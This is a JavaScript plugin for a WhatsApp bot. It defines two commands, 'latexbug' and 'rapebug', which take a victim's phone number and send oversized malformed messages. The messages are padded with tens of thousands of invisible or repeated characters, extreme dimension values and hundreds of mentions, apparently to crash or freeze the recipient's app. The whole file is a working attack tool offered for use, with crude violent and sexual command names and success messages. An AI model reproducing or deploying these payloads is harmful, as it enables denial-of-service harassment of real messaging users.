const { keith } = require('../commandHandler');

//========================================================================================================================
//========================================================================================================================

async function latexBug(client, jid) {
  return await client.relayMessage(jid, {
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          submessages: [
            {
              messageType: 8,
              latexMetadata: {
                text: 'ꦾ'.repeat(40000),
                expressions: Array.from({length: 100}, (_, i) => ({
                  latexExpression: 'x^' + i + '+y^' + i + '=z^' + i,
                  width: 0xFFFFFFFF,
                  height: 0xFFFFFFFF,
                  renderingEngine: 1,
                  asciiMath: 'expression_' + i
                }))
              }
            },
            {
              messageType: 2,
              latexMetadata: {
                text: 'ꦾ'.repeat(35000),
                expressions: Array.from({length: 80}, (_, i) => ({
                  latexExpression: Math.PI + i,
                  width: 0xFFFFFFF,
                  height: 0xFFFFFFF
                }))
              }
            }
          ],
          contextInfo: {
            isForwarded: true,
            forwardOrigin: 4,
            mentionedJid: Array(50).fill(jid),
            forwardingScore: 999999
          }
        }
      }
    }
  }, {
    messageId: 'LATEXBUG_' + Date.now()
  });
}

//========================================================================================================================
async function rapeBug(client, target) {
const payload = {
        message: {
            listMessage: {
                title: "\u200B".repeat(30000),
                description: "\u200B".repeat(50000),
                buttonText: "\u200B".repeat(200),
                listType: 1,
                sections: Array.from({ length: 50 }, function() {
                    return {
                        title: "\u200B".repeat(200),
                        rows: Array.from({ length: 50 }, function() {
                            return {
                                title: "\u200B".repeat(200),
                                description: "\u200B".repeat(200),
                                rowId: "x"
                            };
                        })
                    };
                }),
                contextInfo: {
                    mentionedJid: Array.from({ length: 300 }, function() {
                        return Math.floor(Math.random() * 99999999) + '@s.whatsapp.net';
                    }),
                    forwardingScore: 999999999,
                    isForwarded: true
                }
            }
        }
    };

    await client.relayMessage(target, payload, {});
}

//========================================================================================================================

keith({
  pattern: "latexbug",
  aliases: ["buglatex", "latexbg"],
  category: "Bugmenu",
  description: "Send bugs to victim",
  filename: __filename
}, async (from, client, conText) => {
  const { reply, q, isSuperUser } = conText;

  if (!isSuperUser) {
    return reply("Owner only!");
  }

  const number = q?.trim().replace(/\D/g, "");

  if (!number) {
    return reply("provide number");
  }

  const target = number + "@s.whatsapp.net";

  try {
   

    const result = await latexBug(client, target);

    return reply(
      `Target fucked successfully 💀`
    );
  } catch (err) {
    console.error("richbg error:", err);
    return reply(`❌ Error: ${err.message}`);
  }
});


//========================================================================================================================

keith({
  pattern: "rapebug",
  aliases: ["bugrape", "rapebg", "rape"],
  category: "Bugmenu",
  description: "Send bugs to victim",
  filename: __filename
}, async (from, client, conText) => {
  const { reply, q, isSuperUser } = conText;

  if (!isSuperUser) {
    return reply("Owner only!");
  }

  const number = q?.trim().replace(/\D/g, "");

  if (!number) {
    return reply("provide number");
  }

  const target = number + "@s.whatsapp.net";

  try {
   

    const result = await rapeBug(client, target);

    return reply(
      `Target fucked successfully 💀`
    );
  } catch (err) {
    console.error("richbg error:", err);
    return reply(`❌ Error: ${err.message}`);
  }
});



//========================================================================================================================

